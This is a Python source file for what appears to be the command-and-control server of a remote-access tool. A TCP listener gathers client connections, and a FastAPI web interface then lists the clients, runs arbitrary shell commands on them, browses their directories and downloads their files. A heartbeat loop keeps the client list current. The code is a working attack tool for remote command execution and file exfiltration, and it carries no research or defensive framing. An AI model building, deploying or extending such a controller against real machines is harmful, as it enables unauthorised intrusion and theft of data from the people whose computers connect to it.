from starlette.background import BackgroundTask
from starlette.responses import FileResponse
from fastapi import FastAPI
import threading
import uvicorn
import socket
import json
import time
import os

socketHost = 'localhost'
socketPort = 8088
webapi = FastAPI()
server = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
socket_conns = {}

# region - TCP Connections

def listen_tcp():
    while True:
        client_socket,address = server.accept() # Accept TCP connection
        conn_name = address[0] + ':' + str(address[1])
        print('Connection ' + conn_name) # Print connection base info
        socket_conns[conn_name] = client_socket # add connection to dic

# endregion

# region - WebAPI

# Receive dynamic length socket data
def recv_dyn_socket(client, type, content):
    client.send(json.dumps({
        'type': type,
        'content': content
    }).encode())
    recv_length = 2048
    while True:
        recv_data = client.recv(recv_length).decode()
        json_data = json.loads(recv_data)
        match json_data['type']:
            case 'length':
                recv_length = json_data['content']
                client.send(json.dumps({
                    'type': 'okay'
                }).encode())
                continue
            case 'data':
                return json_data['content']


@webapi.get("/") # Get server version
def server_version():
    return { 'Server-Version': '0.1' }


@webapi.get("/list/") # Get client list
def list_connections():
    conn_list = dict()
    for key in list(socket_conns.keys()):
        conn_list[key] = str(socket_conns[key])
    return conn_list


@webapi.get("/shell/{conn_address}") # Execute shell in client
def exec_shell(conn_address:str, command:str=None):
    try:
        client = socket_conns[conn_address]
        return recv_dyn_socket(client, 'shell', command)
    except:
        return 'Undefind client'


@webapi.get("/dir/{conn_address}") # List dir in client
def scan_dir(conn_address:str, path:str=None):
    try:
        client = socket_conns[conn_address]
        return recv_dyn_socket(client, 'scandir', path)
    except Exception as e:
        return 'Undefind client ' + str(e)


@webapi.get("/download/{conn_address}") # Download file from client
def download_file(conn_address:str, path:str=None):
    try:
        client = socket_conns[conn_address]
        buf = bytearray.fromhex(recv_dyn_socket(client, 'downfile', path))
        temp_file = os.getcwd() + os.path.sep + 'temp' + os.path.sep + os.path.split(path)[-1]
        with open(temp_file, 'wb') as file:
            file.write(buf)
        return FileResponse(
            temp_file,
            filename=os.path.split(path)[-1],
            background=BackgroundTask(lambda: os.remove(temp_file))
            )
    except Exception as e:
        return 'Undefind client ' + str(e)

#endregion

# region - Heartbeat check alive

def client_heartbeat():
    while True:
        for key in list(socket_conns.keys()):
            try:
                heartbeat = socket_conns[key]
                heartbeat.send(json.dumps({
                    'type': 'heartbeat'
                }).encode())
            except socket.error as e:
                print('Connection lost ' + key + ' : ' + e.strerror)
                socket_conns.pop(key)
        time.sleep(1)

# endregion

# region - Run service in thread

def fastapi(): # fastapi service
    uvicorn.run(webapi, host='0.0.0.0', port=8090)


def tcplistener(): # socket tcp service
    server.bind((socketHost, socketPort))
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.listen(128)
    print('\033[0;32mINFO\033[0m' + ':     Socket listen on' + socketHost + ':' + str(socketPort))
    listen_tcp()

# endregion

if __name__ == "__main__":
    if not os.path.exists(os.getcwd() + os.path.sep + 'temp'): os.mkdir(os.getcwd() + os.path.sep + 'temp')
    fastAPI = threading.Thread(target=fastapi,name='FastAPI').start()
    tcpListener = threading.Thread(target=tcplistener,name='TCPListener').start()
    heartbeat = threading.Thread(target=client_heartbeat,name='HeartBeat').start()
